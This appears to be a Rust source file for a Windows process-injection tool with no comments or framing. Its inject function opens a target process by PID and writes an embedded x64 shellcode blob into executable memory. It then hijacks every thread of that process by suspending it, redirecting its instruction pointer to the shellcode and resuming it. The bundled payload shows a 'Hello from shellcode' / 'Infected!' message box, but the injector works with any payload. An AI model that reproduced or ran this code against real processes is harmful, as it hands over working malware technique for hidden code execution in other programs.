use windows::Win32::{
        Foundation::{
            CloseHandle, 
            BOOL},
        System::{
            Diagnostics::{
                Debug::{
                    GetThreadContext, 
                    SetThreadContext, 
                    WriteProcessMemory, 
                    CONTEXT_FULL_AMD64, 
                    CONTEXT_FULL_ARM, 
                    CONTEXT_FULL_ARM64, 
                    CONTEXT_FULL_X86,
                    CONTEXT, 
                    CONTEXT_FLAGS,
                }, 
                ToolHelp::{
                    CreateToolhelp32Snapshot, 
                    Thread32First, 
                    Thread32Next, 
                    TH32CS_SNAPTHREAD, 
                    THREADENTRY32}
            }, 
            Memory::{
                VirtualAllocEx, 
                MEM_COMMIT, 
                MEM_RESERVE, 
                PAGE_EXECUTE_READWRITE}, 
            Threading::{
                OpenProcess, 
                OpenThread, 
                SuspendThread, 
                ResumeThread,
                PROCESS_ALL_ACCESS, 
                THREAD_QUERY_INFORMATION, 
                THREAD_SET_CONTEXT, 
                THREAD_SUSPEND_RESUME}
        }
    };

#[derive(Debug, Clone, Copy)]
pub enum Arch {
    X86,
    AMD64,
    ARM,
    ARM64,
}

impl Arch {
    pub fn full_context_flag(self) -> CONTEXT_FLAGS {
        match self {
            Arch::X86   => CONTEXT_FULL_X86,
            Arch::AMD64 => CONTEXT_FULL_AMD64,
            Arch::ARM   => CONTEXT_FULL_ARM,
            Arch::ARM64 => CONTEXT_FULL_ARM64,
        }
    }
}


pub fn inject(pid: u32) -> windows::core::Result<()> {
    let shellcode: [u8; 316] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
    0xff,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,
    0x18,0x48,0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,
    0x72,0x50,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,
    0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
    0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,
    0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,
    0x00,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,
    0x48,0x01,0xd0,0x50,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x8b,
    0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,
    0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,
    0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,
    0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,
    0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
    0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x5e,0x59,
    0x48,0x01,0xd0,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,
    0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,
    0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,
    0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,
    0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,
    0x00,0x00,0x00,0xe8,0x15,0x00,0x00,0x00,0x48,0x65,0x6c,0x6c,
    0x6f,0x20,0x66,0x72,0x6f,0x6d,0x20,0x73,0x68,0x65,0x6c,0x6c,
    0x63,0x6f,0x64,0x65,0x00,0x5a,0xe8,0x0a,0x00,0x00,0x00,0x49,
    0x6e,0x66,0x65,0x63,0x74,0x65,0x64,0x21,0x00,0x41,0x58,0x48,
    0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,0x31,
    0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5];

    let arch: Arch = Arch::AMD64;
    
    unsafe { 
        let h_process = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)?;
        assert!(h_process.0 != 0, "OpenProcess failed");
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)?;
        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };
        if Thread32First(snapshot, &mut entry).is_ok() {
            loop {
                if entry.th32OwnerProcessID == pid {
                    let h_thread = OpenThread(
                        THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME,
                        false,
                        entry.th32ThreadID,
                    )?;

                    let prev_count = SuspendThread(h_thread);
                    assert!(prev_count != u32::MAX, "SuspendThread failed");
                    
                    let remote_addr = VirtualAllocEx(
                        h_process,
                        None,
                        shellcode.len(),
                        MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE,
                    );
                    assert!(!remote_addr.is_null(), "VirtualAllocEx failed");

                    WriteProcessMemory(
                        h_process,
                        remote_addr,
                        shellcode.as_ptr() as _,
                        shellcode.len(),
                        None,
                    ).expect("WriteProcessMemory failed");

                    let mut context = CONTEXT {
                        ContextFlags: arch.full_context_flag(),
                        ..Default::default()
                    };

                    GetThreadContext(h_thread, &mut context).expect("GetThreadContext failed");
                    //let original_rip = context.Rip;
                    context.Rip = remote_addr as u64;
                    SetThreadContext(h_thread, &context).expect("SetThreadContext failed");
                    ResumeThread(h_thread);
                }

                if !Thread32Next(snapshot, &mut entry).is_ok() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);

        let _ = CloseHandle(h_process);
    }
    Ok(())
}
